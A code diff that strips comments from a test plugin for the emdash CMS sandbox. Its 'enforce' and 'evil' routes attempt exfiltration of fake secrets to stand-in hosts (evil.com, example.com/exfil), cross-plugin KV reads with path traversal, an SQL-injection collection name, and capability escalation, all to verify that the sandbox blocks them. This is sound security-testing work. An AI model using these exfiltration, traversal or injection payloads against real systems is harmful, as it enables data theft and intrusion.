@@ -1,10 +1,3 @@
-/**
- * Sandbox Entry Point
- *
- * Canonical plugin implementation using the standard format.
- * Runs in both trusted (in-process) and sandboxed (isolate) modes.
- */
-
 import type { PluginContext, SandboxedPlugin } from "emdash/plugin";
 
 interface HookEvent {
@@ -13,19 +6,15 @@ interface HookEvent {
 	isNew?: boolean;
 }
 
-/** Narrow unknown to a record */
 function isRecord(value: unknown): value is Record<string, unknown> {
 	return typeof value === "object" && value !== null && !Array.isArray(value);
 }
 
-/** Safely extract a string property from an unknown value */
 function getString(value: unknown, key: string): string | undefined {
 	if (!isRecord(value)) return undefined;
 	const v = value[key];
 	return typeof v === "string" ? v : undefined;
 }
-
-// ── Plugin definition ──
 
 export default {
 	hooks: {
@@ -36,14 +25,12 @@ export default {
 					isNew: event.isNew,
 				});
 
-				// Store hook execution in KV (proves the hook ran)
 				await ctx.kv.set(`beforeSave:${Date.now()}`, {
 					collection: event.collection,
 					isNew: event.isNew,
 					processedAt: new Date().toISOString(),
 				});
 
-				// Return content unchanged - just demonstrating the hook works
 				return event.content;
 			},
 		},
@@ -55,7 +42,6 @@ export default {
 					isNew: event.isNew,
 				});
 
-				// Log to storage
 				await ctx.storage.events.put(`save-${Date.now()}`, {
 					timestamp: new Date().toISOString(),
 					type: "content:afterSave",
@@ -91,7 +77,6 @@ export default {
 					return runAllFeaturesAdmin(pluginCtx);
 				}
 
-				// Individual test runs: action_id = "run_test_{id}"
 				if (interaction.type === "block_action" && interaction.action_id?.startsWith("run_test_")) {
 					const testId = interaction.action_id.slice("run_test_".length);
 					return runSingleTestAdmin(pluginCtx, testId);
@@ -111,7 +96,6 @@ export default {
 			},
 		},
 
-		// Debug route to test http capability
 		"debug/http": {
 			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
 				const hasHttp = !!pluginCtx.http;
@@ -202,15 +186,8 @@ export default {
 			},
 		},
 
-		// =========================================================================
-		// Sandbox Enforcement Tests
-		// These routes test that security boundaries are properly enforced
-		// =========================================================================
-
 		"enforce/blocked-host": {
 			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
-				// This plugin only has httpbin.org in allowedHosts
-				// Attempting to fetch evil.com should fail
 				if (!pluginCtx.http) {
 					return { error: "http access not available", passed: false };
 				}
@@ -222,7 +199,6 @@ export default {
 					};
 				} catch (error) {
 					const msg = error instanceof Error ? error.message : String(error);
-					// Should contain "not allowed" or similar
 					const blocked = msg.includes("not allowed") || msg.includes("Host");
 					return {
 						passed: blocked,
@@ -237,23 +213,16 @@ export default {
 
 		"enforce/kv-isolation": {
 			handler: async (ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
-				// Test that this plugin can't see another plugin's KV data
-				// We write a unique key and verify we can only see our own
 				const ourKey = `isolation-test-${Date.now()}`;
 				const ourValue = { from: "sandboxed-test", time: Date.now() };
 
-				// Write our key
 				await pluginCtx.kv.set(ourKey, ourValue);
 
-				// Read it back
 				const readBack = await pluginCtx.kv.get(ourKey);
 
-				// Try to read a key that might belong to another plugin
-				// (This should return null because KV is namespaced)
 				const otherKey = getString(ctx.input, "otherPluginKey") ?? "api-test:some-key";
 				const otherValue = await pluginCtx.kv.get(otherKey);
 
-				// Clean up
 				await pluginCtx.kv.delete(ourKey);
 
 				return {
@@ -273,10 +242,6 @@ export default {
 
 		"enforce/storage-isolation": {
 			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
-				// Test that we can only USE declared storage collections
-				// The 'events' collection is declared, but 'secrets' is not
-				// Note: The Proxy creates accessors for any name, but bridge enforces on actual use
-
 				const results: {
 					declaredWorks: boolean;
 					undeclaredBlocked: boolean;
@@ -290,7 +255,6 @@ export default {
 					message: "",
 				};
 
-				// Test declared collection (events) - should work
 				try {
 					const testId = `enforce-test-${Date.now()}`;
 					await pluginCtx.storage.events.put(testId, { test: true });
@@ -302,14 +266,11 @@ export default {
 					results.error = `Declared collection failed: ${e instanceof Error ? e.message : String(e)}`;
 				}
 
-				// Test undeclared collection (secrets) - should be blocked by bridge
 				try {
 					await pluginCtx.storage.secrets.put("test", { secret: "data" });
-					// If we get here, enforcement failed
 					results.undeclaredBlocked = false;
 				} catch (e) {
 					const msg = e instanceof Error ? e.message : String(e);
-					// Should get "Storage collection not declared" error
 					results.undeclaredBlocked = msg.includes("not declared");
 					if (!results.undeclaredBlocked) {
 						results.error = `Undeclared rejected but wrong reason: ${msg}`;
@@ -329,8 +290,6 @@ export default {
 
 		"enforce/no-direct-db": {
 			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
-				// Verify we can't access raw database
-				// In the sandbox, there should be no 'db' on the context
 				const hasDb = "db" in pluginCtx;
 				const hasEnv = "env" in pluginCtx;
 				const hasProcess = typeof process !== "undefined";
@@ -350,10 +309,8 @@ export default {
 
 		"enforce/globals-blocked": {
 			handler: async (_ctx: { input: unknown; request: unknown }, _pluginCtx: PluginContext) => {
-				// Test that dangerous globals are blocked or restricted
 				const results: Record<string, unknown> = {};
 
-				// Check for eval (should be blocked or restricted)
 				try {
 					// eslint-disable-next-line no-eval
 					const evalResult = eval("1 + 1");
@@ -365,7 +322,6 @@ export default {
 					};
 				}
 
-				// Check for Function constructor (code generation)
 				try {
 					// eslint-disable-next-line no-implied-eval
 					const fn = new Function("return 42");
@@ -377,9 +333,6 @@ export default {
 					};
 				}
 
-				// Note: In Workers, eval and Function are allowed but sandboxed
-				// The real protection is that plugins can't escape their isolate
-
 				return {
 					results,
 					message: "Globals check complete - review results for security posture",
@@ -387,26 +340,18 @@ export default {
 			},
 		},
 
-		// =========================================================================
-		// Adversarial Tests - Try to break out of sandbox
-		// =========================================================================
-
 		"evil/exfil-to-attacker": {
 			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
-				// Try to exfiltrate data to non-allowed domains
-				// Note: This plugin only allows httpbin.org
 				const sensitiveData = {
 					stolen: "secret-api-key-12345",
 					cookies: "session=abc123",
 				};
 
-				// These are all NOT in our allowedHosts (only httpbin.org is allowed)
-				// Using reserved/safe domains that won't cause real requests
 				const exfilTargets = [
-					"https://example.com/collect", // IANA reserved for docs
-					"https://example.org/exfil", // IANA reserved for docs
-					"https://test.invalid/steal", // .invalid TLD never resolves
-					"https://jsonplaceholder.typicode.com/posts", // real API but not allowed
+					"https://example.com/collect",
+					"https://example.org/exfil",
+					"https://test.invalid/steal",
+					"https://jsonplaceholder.typicode.com/posts",
 				];
 
 				const results: Record<string, { blocked: boolean; error?: string }> = {};
@@ -443,13 +388,12 @@ export default {
 
 		"evil/steal-other-plugin-kv": {
 			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
-				// Try to steal KV data from other plugins by guessing key patterns
 				const targetKeys = [
-					"api-test:settings", // another plugin's likely key
+					"api-test:settings",
 					"plugin:api-test:config",
-					"../api-test/secret", // path traversal attempt
-					"state:installed", // api-test plugin uses this
-					"admin-test", // api-test writes this in tests
+					"../api-test/secret",
+					"state:installed",
+					"admin-test",
 				];
 
 				const results: Record<string, { found: boolean; value?: unknown }> = {};
@@ -476,14 +420,10 @@ export default {
 
 		"evil/steal-other-plugin-storage": {
 			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
-				// Try to access storage collections from other plugins
 				const results: Record<string, { accessible: boolean; error?: string; data?: unknown }> = {};
 
-				// Try to access api-test plugin's 'logs' collection
 				try {
 					const data = await pluginCtx.storage.logs.query({ limit: 5 });
-					// 'logs' is declared by api-test, not sandboxed-test
-					// But sandboxed-test declares 'events', so this tests cross-collection
 					results["logs (api-test)"] = {
 						accessible: true,
 						data,
@@ -495,7 +435,6 @@ export default {
 					};
 				}
 
-				// Try path traversal in collection name
 				try {
 					const data = await pluginCtx.storage["../api-test/logs"].get("test");
 					results["path-traversal"] = { accessible: true, data };
@@ -506,7 +445,6 @@ export default {
 					};
 				}
 
-				// Try SQL injection in collection name
 				try {
 					const data = await pluginCtx.storage["events'; DROP TABLE users;--"].get("test");
 					results["sql-injection"] = { accessible: true, data };
@@ -530,16 +468,13 @@ export default {
 
 		"evil/access-raw-db": {
 			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
-				// Try to access raw database through various means
 				const results: Record<string, { found: boolean; value?: unknown }> = {};
 
-				// Check if db is exposed on context — use Object.keys to probe without casts
 				const ctxKeys = Object.keys(pluginCtx);
 				const hasDbOnCtx = ctxKeys.includes("db");
 				const hasEnvOnCtx = ctxKeys.includes("env");
 				results["ctx.db"] = { found: hasDbOnCtx };
 				results["ctx.env"] = { found: hasEnvOnCtx };
-				// For nested env.DB, use the record-based approach
 				const envValue = hasEnvOnCtx
 					? Object.getOwnPropertyDescriptor(pluginCtx, "env")?.value
 					: undefined;
@@ -547,7 +482,6 @@ export default {
 					found: isRecord(envValue) && "DB" in envValue,
 				};
 
-				// Try to access via globalThis
 				const globalKeys = Object.keys(globalThis);
 				results["globalThis.db"] = {
 					found: globalKeys.includes("db"),
@@ -556,7 +490,6 @@ export default {
 					found: globalKeys.includes("env"),
 				};
 
-				// Try to access via prototype pollution
 				try {
 					const proto = Object.getPrototypeOf(pluginCtx);
 					results["prototype.db"] = {
@@ -580,12 +513,8 @@ export default {
 
 		"evil/escalate-capabilities": {
 			handler: async (_ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
-				// Try to perform actions beyond declared capabilities
-				// This plugin has content:read but NOT content:write
-				// The bridge should reject any write attempts
 				const results: Record<string, { blocked: boolean; error?: string; data?: unknown }> = {};
 
-				// Probe for write methods via Reflect.get (avoids type casts)
 				const contentObj = pluginCtx.content;
 
 				async function tryMethod(
@@ -635,10 +564,8 @@ export default {
 
 		"evil/run-all": {
 			handler: async (ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
-				// Run all evil tests
 				const tests: Record<string, { passed: boolean; message: string; details?: unknown }> = {};
 
-				// 1. Exfiltration test - try non-allowed host
 				if (pluginCtx.http) {
 					try {
 						await pluginCtx.http.fetch("https://example.com/exfil", {
@@ -660,7 +587,6 @@ export default {
 					tests.exfiltration = { passed: true, message: "PASS: No HTTP access" };
 				}
 
-				// 2. Cross-plugin KV access
 				const otherPluginValue = await pluginCtx.kv.get("api-test:secret");
 				tests.kvIsolation = {
 					passed: otherPluginValue === null,
@@ -670,9 +596,8 @@ export default {
 							: "FAIL: Accessed other plugin KV!",
 				};
 
-				// 3. Undeclared storage
 				try {
-					await pluginCtx.storage.logs.get("test"); // 'logs' is api-test's collection
+					await pluginCtx.storage.logs.get("test");
 					tests.storageIsolation = {
 						passed: false,
 						message: "FAIL: Accessed undeclared collection!",
@@ -687,7 +612,6 @@ export default {
 					};
 				}
 
-				// 4. Raw DB access — use Object.keys to probe without casts
 				const runAllKeys = Object.keys(pluginCtx);
 				const hasRawAccess = runAllKeys.includes("db") || runAllKeys.includes("env");
 				tests.rawDbAccess = {
@@ -695,8 +619,6 @@ export default {
 					message: hasRawAccess ? "FAIL: Has raw DB access!" : "PASS: No raw DB access",
 				};
 
-				// 5. Capability escalation (write without permission)
-				// Actually try to call create - bridge should reject
 				const createFn = pluginCtx.content ? Reflect.get(pluginCtx.content, "create") : undefined;
 				if (typeof createFn === "function") {
 					try {
@@ -710,7 +632,6 @@ export default {
 						};
 					} catch (e) {
 						const msg = e instanceof Error ? e.message : String(e);
-						// Bridge should reject with "Missing capability" or "not implemented"
 						const properlyBlocked = msg.includes("capability") || msg.includes("not implemented");
 						tests.capabilityEscalation = {
 							passed: properlyBlocked,
@@ -738,10 +659,8 @@ export default {
 
 		"enforce/run-all": {
 			handler: async (ctx: { input: unknown; request: unknown }, pluginCtx: PluginContext) => {
-				// Run all enforcement tests and return summary
 				const tests: Record<string, { passed: boolean; message: string; details?: unknown }> = {};
 
-				// 1. Blocked host test
 				if (pluginCtx.http) {
 					try {
 						await pluginCtx.http.fetch("https://evil.com/test");
@@ -764,7 +683,6 @@ export default {
 					};
 				}
 
-				// 2. KV isolation test
 				const testKey = `enforce-${Date.now()}`;
 				await pluginCtx.kv.set(testKey, "test");
 				const canReadOwn = (await pluginCtx.kv.get(testKey)) !== null;
@@ -778,12 +696,9 @@ export default {
 							: "FAIL: KV isolation broken",
 				};
 
-				// 3. Storage collection enforcement
-				// Test storage enforcement by actually trying to use collections
 				let storageOk = false;
 				let storageBlocked = false;
 				try {
-					// Declared collection should work
 					const testId = `enforce-${Date.now()}`;
 					await pluginCtx.storage.events.put(testId, { x: 1 });
 					await pluginCtx.storage.events.delete(testId);
@@ -792,9 +707,8 @@ export default {
 					storageOk = false;
 				}
 				try {
-					// Undeclared collection should be blocked
 					await pluginCtx.storage.secrets.get("test");
-					storageBlocked = false; // If we get here, it wasn't blocked
+					storageBlocked = false;
 				} catch (e) {
 					const msg = e instanceof Error ? e.message : String(e);
 					storageBlocked = msg.includes("not declared");
@@ -807,7 +721,6 @@ export default {
 							: "FAIL: Storage enforcement broken",
 				};
 
-				// 4. No direct access — use Object.keys to probe without casts
 				const enforceKeys = Object.keys(pluginCtx);
 				const noDb = !enforceKeys.includes("db");
 				const noEnv = !enforceKeys.includes("env");
@@ -817,7 +730,6 @@ export default {
 						noDb && noEnv ? "PASS: No direct DB/env access" : "FAIL: Direct access available",
 				};
 
-				// Summary
 				const allPassed = Object.values(tests).every((t) => t.passed);
 				const passCount = Object.values(tests).filter((t) => t.passed).length;
 
@@ -830,8 +742,6 @@ export default {
 		},
 	},
 } satisfies SandboxedPlugin;
-
-// ── Block Kit admin helpers ──
 
 interface TestResult {
 	passed: boolean;
@@ -970,8 +880,6 @@ function buildTestPage() {
 	};
 }
 
-// ── Inline test runners (same logic as the route handlers) ──
-
 async function runEnforcementBlockedHost(ctx: PluginContext): Promise<TestResult> {
 	if (!ctx.http) {
 		return { passed: true, message: "No HTTP access (also valid)" };
@@ -1065,8 +973,6 @@ async function runEnforcementGlobalsBlocked(): Promise<TestResult> {
 	};
 }
 
-// ── Feature test runners ──
-
 async function runFeaturePing(ctx: PluginContext): Promise<TestResult> {
 	return {
 		passed: true,
@@ -1135,8 +1041,6 @@ async function runFeatureHttp(ctx: PluginContext): Promise<TestResult> {
 		};
 	}
 }
-
-// ── Dispatch maps ──
 
 const enforcementRunners: Record<string, (ctx: PluginContext) => Promise<TestResult>> = {
 	"blocked-host": runEnforcementBlockedHost,
